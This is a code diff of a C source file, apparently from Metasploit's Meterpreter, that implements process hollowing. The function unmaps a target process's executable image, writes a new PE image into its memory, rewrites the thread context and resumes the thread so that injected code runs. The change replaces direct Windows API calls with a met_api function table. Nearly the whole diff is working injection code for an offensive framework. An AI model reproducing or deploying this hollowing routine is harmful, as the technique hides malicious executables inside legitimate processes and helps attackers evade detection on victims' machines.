@@ -14,6 +14,7 @@
  * - original PE based method by steve10120 [at] ic0de.org
  */
 #include "precomp.h"
+#include "common_metapi.h"
 
 typedef enum _PROCESSINFOCLASS
 {
@@ -59,8 +60,6 @@ BOOL MapNewExecutableRegionInProcess(
 		IN HANDLE TargetThreadHandle,
 		IN LPVOID NewExecutableRawImage);
 
-typedef LONG (WINAPI * NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
-
 DWORD_PTR Align(DWORD_PTR Value, DWORD_PTR Alignment)
 {
 	DWORD_PTR dwResult = Value;
@@ -83,7 +82,6 @@ BOOL MapNewExecutableRegionInProcess(
 	PIMAGE_DOS_HEADER         DosHeader;
 	PIMAGE_NT_HEADERS         NtHeader64;
 	DWORD_PTR                 dwImageBase;
-	NtUnmapViewOfSection      pNtUnmapViewOfSection;
 	LPVOID                    pImageBase;
 	SIZE_T                    dwBytesWritten;
 	SIZE_T                    dwBytesRead;
@@ -98,35 +96,33 @@ BOOL MapNewExecutableRegionInProcess(
 		if (NtHeader64->Signature == IMAGE_NT_SIGNATURE)
 		{
 			RtlZeroMemory(&BasicInformation, sizeof(PROCESS_INFORMATION));
-			ThreadContext = (PCONTEXT)VirtualAlloc(NULL, sizeof(ThreadContext) + 4, MEM_COMMIT, PAGE_READWRITE);
+			ThreadContext = (PCONTEXT)met_api->win_api.kernel32.VirtualAlloc(NULL, sizeof(ThreadContext) + 4, MEM_COMMIT, PAGE_READWRITE);
 			ThreadContext = (PCONTEXT)Align((DWORD)ThreadContext, 4);
 			ThreadContext->ContextFlags = CONTEXT_FULL;
-			if (GetThreadContext(TargetThreadHandle, ThreadContext)) //used to be LPCONTEXT(ThreadContext)
+			if (met_api->win_api.kernel32.GetThreadContext(TargetThreadHandle, ThreadContext)) //used to be LPCONTEXT(ThreadContext)
 			{
-				ReadProcessMemory(TargetProcessHandle, (LPCVOID)(ThreadContext->Rdx + 16), &dwImageBase, sizeof(DWORD_PTR), &dwBytesRead);
+				met_api->win_api.kernel32.ReadProcessMemory(TargetProcessHandle, (LPCVOID)(ThreadContext->Rdx + 16), &dwImageBase, sizeof(DWORD_PTR), &dwBytesRead);
 
-				pNtUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
-				if (pNtUnmapViewOfSection)
-					pNtUnmapViewOfSection(TargetProcessHandle, (PVOID)dwImageBase);
+				met_api->win_api.ntdll.ZwUnmapViewOfSection(TargetProcessHandle, (PVOID)dwImageBase);
 
-				pImageBase = VirtualAllocEx(TargetProcessHandle, (LPVOID)NtHeader64->OptionalHeader.ImageBase, NtHeader64->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
+				pImageBase = met_api->win_api.kernel32.VirtualAllocEx(TargetProcessHandle, (LPVOID)NtHeader64->OptionalHeader.ImageBase, NtHeader64->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
 				if (pImageBase)
 				{
-					WriteProcessMemory(TargetProcessHandle, pImageBase, (LPCVOID)NewExecutableRawImage, NtHeader64->OptionalHeader.SizeOfHeaders, &dwBytesWritten);
+					met_api->win_api.kernel32.WriteProcessMemory(TargetProcessHandle, pImageBase, (LPCVOID)NewExecutableRawImage, NtHeader64->OptionalHeader.SizeOfHeaders, &dwBytesWritten);
 					SectionHeader = IMAGE_FIRST_SECTION(NtHeader64);
 					for (Count = 0; Count < NtHeader64->FileHeader.NumberOfSections; Count++)
 					{
-						WriteProcessMemory(TargetProcessHandle, (LPVOID)((DWORD_PTR)pImageBase + SectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)NewExecutableRawImage + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, &dwBytesWritten);
+						met_api->win_api.kernel32.WriteProcessMemory(TargetProcessHandle, (LPVOID)((DWORD_PTR)pImageBase + SectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)NewExecutableRawImage + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, &dwBytesWritten);
 						SectionHeader++;
 					}
-					WriteProcessMemory(TargetProcessHandle, (LPVOID)(ThreadContext->Rdx + 16), (LPVOID)&NtHeader64->OptionalHeader.ImageBase, sizeof(DWORD_PTR), &dwBytesWritten);
+					met_api->win_api.kernel32.WriteProcessMemory(TargetProcessHandle, (LPVOID)(ThreadContext->Rdx + 16), (LPVOID)&NtHeader64->OptionalHeader.ImageBase, sizeof(DWORD_PTR), &dwBytesWritten);
 					ThreadContext->Rcx = (DWORD_PTR)pImageBase + NtHeader64->OptionalHeader.AddressOfEntryPoint;
-					SetThreadContext(TargetThreadHandle, (LPCONTEXT)ThreadContext);
-					ResumeThread(TargetThreadHandle);
+					met_api->win_api.kernel32.SetThreadContext(TargetThreadHandle, (LPCONTEXT)ThreadContext);
+					met_api->win_api.kernel32.ResumeThread(TargetThreadHandle);
 					Success = TRUE;
 				}
 				else
-					TerminateProcess(TargetProcessHandle, 0);
+					met_api->win_api.kernel32.TerminateProcess(TargetProcessHandle, 0);
 				//VirtualFree(ThreadContext, 0, MEM_RELEASE);
 			}
 		}
@@ -146,8 +142,6 @@ BOOL MapNewExecutableRegionInProcess(
 	PIMAGE_DOS_HEADER         DosHeader;
 	PIMAGE_NT_HEADERS         NtHeader;
 	PMINI_PEB                 ProcessPeb;
-	NTSTATUS                  (NTAPI *NtUnmapViewOfSection)(HANDLE, LPVOID) = NULL;
-	NTSTATUS                  (NTAPI *NtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, LPVOID, ULONG, PULONG) = NULL;
 	NTSTATUS                  Status;
 	CONTEXT                   ThreadContext;
 	LPVOID                    OldEntryPoint = NULL;
@@ -176,7 +170,7 @@ BOOL MapNewExecutableRegionInProcess(
 
 		ThreadContext.ContextFlags = CONTEXT_INTEGER;
 
-		if (!GetThreadContext(
+		if (!met_api->win_api.kernel32.GetThreadContext(
 					TargetThreadHandle,
 					&ThreadContext))
 		{
@@ -189,16 +183,11 @@ BOOL MapNewExecutableRegionInProcess(
 		// Unmap the old executable region in the child process to avoid
 		// conflicts
 		//
-		NtUnmapViewOfSection = (NTSTATUS (NTAPI *)(HANDLE, LPVOID))GetProcAddress(
-				GetModuleHandle(
-					TEXT("NTDLL")),
-				"NtUnmapViewOfSection");
-
-		if ((Status = NtUnmapViewOfSection(
+		if ((Status = met_api->win_api.ntdll.ZwUnmapViewOfSection(
 						TargetProcessHandle,
 						OldEntryPoint)) != ERROR_SUCCESS)
 		{
-			SetLastError(ERROR_INVALID_ADDRESS);
+			met_api->win_api.kernel32.SetLastError(ERROR_INVALID_ADDRESS);
 			break;
 		}
 
@@ -208,7 +197,7 @@ BOOL MapNewExecutableRegionInProcess(
 		ThreadContext.Eax = NtHeader->OptionalHeader.AddressOfEntryPoint +
 			NtHeader->OptionalHeader.ImageBase;
 
-		if (!SetThreadContext(
+		if (!met_api->win_api.kernel32.SetThreadContext(
 					TargetThreadHandle,
 					&ThreadContext))
 			break;
@@ -216,7 +205,7 @@ BOOL MapNewExecutableRegionInProcess(
 		//
 		// Allocate storage for the new executable in the child process
 		//
-		if (!(TargetImageBase = VirtualAllocEx(
+		if (!(TargetImageBase = met_api->win_api.kernel32.VirtualAllocEx(
 						TargetProcessHandle,
 						(LPVOID)NtHeader->OptionalHeader.ImageBase,
 						NtHeader->OptionalHeader.SizeOfImage,
@@ -227,12 +216,7 @@ BOOL MapNewExecutableRegionInProcess(
 		//
 		// Update the executable's image base address in the PEB...
 		//
-		NtQueryInformationProcess = (NTSTATUS (NTAPI *)(HANDLE, PROCESSINFOCLASS, LPVOID, ULONG, PULONG))GetProcAddress(
-				GetModuleHandle(
-					TEXT("NTDLL")),
-				"NtQueryInformationProcess");
-
-		if (NtQueryInformationProcess(
+		if (met_api->win_api.ntdll.ZwQueryInformationProcess(
 					TargetProcessHandle,
 					ProcessBasicInformation,
 					&BasicInformation,
@@ -242,7 +226,7 @@ BOOL MapNewExecutableRegionInProcess(
 
 		ProcessPeb = BasicInformation.PebBaseAddress;
 
-		if (!WriteProcessMemory(
+		if (!met_api->win_api.kernel32.WriteProcessMemory(
 					TargetProcessHandle,
 					(LPVOID)&ProcessPeb->ImageBaseAddress,
 					(LPVOID)&NtHeader->OptionalHeader.ImageBase,
@@ -253,7 +237,7 @@ BOOL MapNewExecutableRegionInProcess(
 		//
 		// Copy the image headers and all of the section contents
 		//
-		if (!WriteProcessMemory(
+		if (!met_api->win_api.kernel32.WriteProcessMemory(
 					TargetProcessHandle,
 					TargetImageBase,
 					NewExecutableRawImage,
@@ -275,7 +259,7 @@ BOOL MapNewExecutableRegionInProcess(
 					(SectionHeader[SectionIndex].Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA))
 				continue;
 
-			if (!WriteProcessMemory(
+			if (!met_api->win_api.kernel32.WriteProcessMemory(
 						TargetProcessHandle,
 						(LPVOID)((PCHAR)TargetImageBase +
 							SectionHeader[SectionIndex].VirtualAddress),
